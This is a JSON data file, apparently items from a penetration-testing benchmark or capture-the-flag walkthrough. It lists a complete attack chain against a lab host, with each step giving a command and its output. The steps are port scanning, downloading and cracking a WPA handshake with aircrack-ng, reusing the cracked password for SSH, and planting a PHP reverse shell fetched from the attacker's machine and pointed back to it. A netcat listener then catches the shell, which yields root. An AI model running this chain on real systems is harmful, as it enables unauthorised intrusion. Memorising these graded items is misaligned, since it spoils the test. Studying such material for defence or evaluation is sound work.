[
    {
        "tactic": "Reconnaissance",
        "prerequisites": ["Network connectivity to target", "Target IP address known: 192.168.1.104"],
        "contraindications": [],
        "goal": "Identify open ports and running services on the target system",
        "command": "nmap -p- -A 192.168.1.104",
        "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 02:44 EDT\nNmap scan report for 192.168.1.104\nHost is up (0.00036 latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: SHA256:U2U2:U2U2:U2U2:U2U2:U2U2:U2U2:U2U2:U2U\n|   2048 ea:e8:15:7d:8a:74:bc:45:09:76:34:13:2c:d8:1e:62 (RSA)\n|   256 51:75:37:23:b6:0f:7d:ed:61:a0:61:18:21:89:35:5d (ECDSA)\n|_  256 7d:36:08:ba:91:ef:24:9f:7b:24:f6:64:c7:53:2c:b0 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: 403 Forbidden\n8080/tcp open  http    BusyBox httpd 1.13\n|_http-title: 404 Not Found\n8999/tcp open  http    WebFS httpd 1.21\n|_http-server-header: webfs/1.21\n|_http-title: 0.0.0.0:8999/\n9000/tcp open  http    PHP cgi server 5.5 or later (PHP 7.2.30-1)\n|_http-title: Uncaght Exception: MissingDatabaseExtensionException\nMAC Address: 08:00:27:AC:14:C3 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open a\nAggressive OS guesses: Linux 2.6.32 (93%), Linux 3.10 (93%), Linux 3.10 - 4.11 (93%), ux 2.6.22 - 2.6.36 (89%), Linux 2.6.39 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.36 ms 192.168.1.104",
        "results": ["Ports 22 (SSH), 80 (HTTP), 8080 (HTTP), 8999 (HTTP), and 9000 (HTTP) are open", "Target is running Ubuntu Linux with Apache and various web services"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Discovery",
        "prerequisites": ["Port 8999 identified as open and running WebFS httpd 1.21"],
        "contraindications": [],
        "goal": "Enumerate web services and discover interesting files on port 8999",
        "command": "curl http://192.168.1.104:8999/",
        "output": "# listing:\n\n| access    | user    | group    | date    | size | name    |\n| drwxr-xr-x  | nobody  | nogroup  | Apr 07 22:38 | <DIR> | wordpress    |\n| drwxr-xr-x  | nobody  | nogroup  | Mar 31 20:03 | <DIR> | wp-admin    |\n| drwxr-xr-x  | nobody  | nogroup  | Mar 31 20:03 | <DIR> | wp-content    |\n| -rw-r--r--  | root    | root    | Apr 07 22:33 | 197  | wp-includes    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 405  | WPA-01.cap    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 12 11:54 | 19   | index.php    |\n| -rw-r--r--  | nobody  | nogroup  | Jan 10 14:05 | 7278 | license.txt    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 6912 | readme.html    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 351  | wp-activate.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2275 | wp-blog-header.php |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2913 | wp-comments-post.php |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3940 | wp-config-sample.php |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 2496 | wp-cron.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3300 | wp-links-opml.php |\n| -rw-r--r--  | nobody  | nogroup  | Feb 10 03:50 | 46   | wp-load.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 8501 | wp-login.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 10 22:33 | 18   | wp-mail.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 30   | wp-settings.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 4755 | wp-signup.php    |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 | 3133 | wp-trackback.php |\n| -rw-r--r--  | nobody  | nogroup  | Feb 06 06:33 |    | xmlrpc.php    |\n\nwebfs/1.21  18/May/2020 06:46:08 GMT",
        "results": ["WordPress files discovered", "WPA-01.cap file identified as potentially interesting"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Collection",
        "prerequisites": ["WPA-01.cap file identified on port 8999"],
        "contraindications": [],
        "goal": "Download the WPA-01.cap file for further analysis",
        "command": "wget http://192.168.1.104:8999/WPA-01.cap",
        "output": "--2020-05-18 06:46:08--  http://192.168.1.104:8999/WPA-01.cap\nConnecting to 192.168.1.104:8999... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 405 [application/octet-stream]\nSaving to: 'WPA-01.cap'\n\nWPA-01.cap                                                  100%[===============================\n2020-05-18 06:46:08 (500 MB/s) - 'WPA-01.cap' saved [405/405]",
        "results": ["WPA-01.cap file downloaded successfully"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Discovery",
        "prerequisites": ["WPA-01.cap file downloaded"],
        "contraindications": [],
        "goal": "Analyze the capture file to extract SSID information",
        "command": "tshark -r WPA-01.cap | grep SSID",
        "output": "dlink",
        "results": ["SSID identified as 'dlink'"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Credential Access",
        "prerequisites": ["WPA-01.cap file available", "Rockyou wordlist available at /usr/share/wordlists/rockyou.txt"],
        "contraindications": [],
        "goal": "Crack the WPA password from the captured handshake",
        "command": "aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap",
        "output": "Reading packets, please wait ...\nOpening WPA-01.cap\nRead 1918 packets.\n\n  #   BSSID               ESSID         Encryption\n  1   5C:D9:98:5A:B6:62   dlink         WPA (1 handshake)\n\nChoosing first network as target.\n\nReading packets, please wait ...\nOpening WPA-01.cap\nRead 1918 packets.\n\n1 potential targets\n\nAircrack-ng 1.6\n\n[00:00:08] 74575/14344392 keys tested (9469.79 k/s)\n\nTime left: 25 minutes, 7 seconds    0.52%\n\n                    KEY FOUND! [p4ssword]\n\nMaster Key    : 8F C0 1B 1B 85 06 0B 85 23 7C 83 74 F8 4B 4A FD\n                50 CE EC 72 6F 85 17 5F B1 14 5E D2 F2 47 5D 1A\n\nTransient Key : 13 41 36 81 4A 92 19 CF EC 14 B8 FD 20 2C D4 2E\n                BA A1 95 79 CE 15 5F 1A 2C DE 03 A8 2B 52 68 64\n                D3 77 A7 E4 FF CD 49 0C ED E9 5E 3B 68 E6 83 26\n                06 0C 98 8D 43 B6 7C E4 FE ED 2E 45 90 0D 6D 15\n\nEAPOL HMAC    : 33 A5 CE E2 46 DB 4B 96 86 A1 6E D9 D2 A2 A6 E9",
        "results": ["WPA password cracked: p4ssword", "Credentials obtained: dlink / p4ssword"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Initial Access",
        "prerequisites": ["SSH credentials obtained: dlink / p4ssword", "SSH service running on port 22"],
        "contraindications": [],
        "goal": "Establish SSH connection to the target system",
        "command": "ssh dlink@192.168.1.104",
        "output": "dlink@192.168.1.104's password:",
        "results": ["SSH password prompt for user dlink"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Initial Access",
        "prerequisites": ["SSH credentials obtained: dlink / p4ssword", "SSH service running on port 22"],
        "contraindications": [],
        "goal": "Establish SSH connection to the target system",
        "command": "p4ssword",
        "output": "Last login: Tue Apr  7 23:36:49 2020 from 192.168.86.99\ndlink@victim01:~$",
        "results": ["SSH access established as user dlink"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Discovery",
        "prerequisites": ["SSH access as user dlink"],
        "contraindications": [],
        "goal": "Identify writable directories for potential privilege escalation",
        "command": "find / -writable -type d 2>/dev/null",
        "output": "/run/screen\n/run/lock\n/home/dlink\n/var/www/bolt/app/config\n/var/www/bolt/app/cache\n/var/www/bolt/app/database\n/var/www/bolt/public/files\n/var/tmp\n/var/lib/lxcfs/proc\n/var/lib/lxcfs/cgroup\n/var/lib/php/sessions\n/var/crash\n/tmp\n/tmp/.XIM-unix\n/tmp/.font-unix\n/tmp/.Test-unix\n/tmp/.ICE-unix\n/tmp/.X11-unix\n/proc/13759/task/13759/fd\n/proc/13759/fd\n/proc/13759/map_files\n/dev/mqueue\n/dev/shm",
        "results": ["Writable directory identified: /var/www/bolt/public/files"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Discovery",
        "prerequisites": ["Writable directory /var/www/bolt/public/files identified"],
        "contraindications": [],
        "goal": "Verify permissions and ownership of the writable directory",
        "command": "ls -la /var/www/bolt/public/",
        "output": "total 40\ndrwxr-xr-x 7 root root 4096 Apr  7 22:01 .\ndrwxr-xr-x 7 root root 4096 Apr  7 20:45 ..\n-rw-r--r-- 1 root root 2956 Aug 25  2018 .htaccess\ndrwxr-xr-x 6 root root 4096 Nov 12  2019 bolt-public\n-rwxr-xr-x 1 root root   45 Apr  7 22:01 bolt_start.sh\ndrwxr-xr-x 2 root root 4096 Aug 25  2018 extensions\ndrwxrwxrwx 2 root root 4096 Nov 12  2019 files\n-rw-r--r-- 1 root root  295 Aug 25  2018 index.php\ndrwxr-xr-x 5 root root 4096 Nov 12  2019 theme\ndrwxr-xr-x 2 root root 4096 Aug 25  2018 thumbs",
        "results": ["Directory /var/www/bolt/public/files is owned by root with world-writable permissions (drwxrwxrwx)"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Execution",
        "prerequisites": ["Write access to /var/www/bolt/public/files", "PHP reverse shell available on attacker machine at 192.168.1.112:8000"],
        "contraindications": [],
        "goal": "Download PHP reverse shell to the writable directory",
        "command": "wget <GitHub_URL> -P /var/www/bolt/public/files/ \nsed -i -e 's/$ip = '127.0.0.1'/$ip = '192.168.1.112'/g' /var/www/bolt/public/files/php-reverse-shell.php",
        "output": "--2020-05-18 07:02:25--  http://192.168.1.112:8000/php-reverse-shell.php\nConnecting to 192.168.1.112:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5495 (5.4K) [application/octet-stream]\nSaving to: 'php-reverse-shell.php'\n\nphp-reverse-shell.php                                       100%[===============================\n2020-05-18 07:02:25 (661 MB/s) - 'php-reverse-shell.php' saved [5495/5495]",
        "results": ["PHP reverse shell uploaded to /var/www/bolt/public/files/php-reverse-shell.php"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Command and Control",
        "prerequisites": ["Attacker machine ready to receive reverse connection"],
        "contraindications": [],
        "goal": "Set up netcat listener to receive reverse shell connection",
        "command": "nc -lvp 1234",
        "output": "listening on [any] 1234 ...",
        "results": ["Netcat listener established on port 1234"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Privilege Escalation",
        "prerequisites": ["PHP reverse shell uploaded to /var/www/bolt/public/files/", "Netcat listener running on attacker machine", "Web service on port 9000 can execute PHP files"],
        "contraindications": [],
        "goal": "Trigger PHP reverse shell to gain root access",
        "command": "curl http://192.168.1.104:9000/files/php-reverse-shell.php",
        "output": "192.168.1.104: inverse host lookup failed: Unknown host\nconnect to [192.168.1.112] from (UNKNOWN) [192.168.1.104] 48282\nLinux victim01 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64\n07:05:29 up 22 min, 1 user,  load average: 0.25, 0.45, 0.60\nUSER    TTY    FROM    LOGIN@    IDLE   JCPU   PCPU WHAT\ndlink    pts/0    192.168.1.112    06:56    2:09    0.06s  0.06s -bash",
        "results": ["Reverse shell connection established"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Privilege Escalation",
        "prerequisites": ["Reverse shell connection established"],
        "contraindications": [],
        "goal": "Verify root privileges obtained",
        "command": "id",
        "output": "uid=0(root) gid=0(root) groups=0(root)",
        "results": ["Root privileges confirmed"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Collection",
        "prerequisites": ["Root access obtained"],
        "contraindications": [],
        "goal": "Navigate to root directory to locate the flag",
        "command": "ls /root",
        "output": "flag.txt\nsnap",
        "results": ["Flag file located at /root/flag.txt"],
        "optional": false,
        "gold": true
    },
    {
        "tactic": "Collection",
        "prerequisites": ["Root access obtained", "Flag file located at /root/flag.txt"],
        "contraindications": [],
        "goal": "Retrieve the flag",
        "command": "cat /root/flag.txt",
        "output": "<FLAG>",
        "results": ["Flag captured successfully"],
        "optional": false,
        "gold": true
    }
]
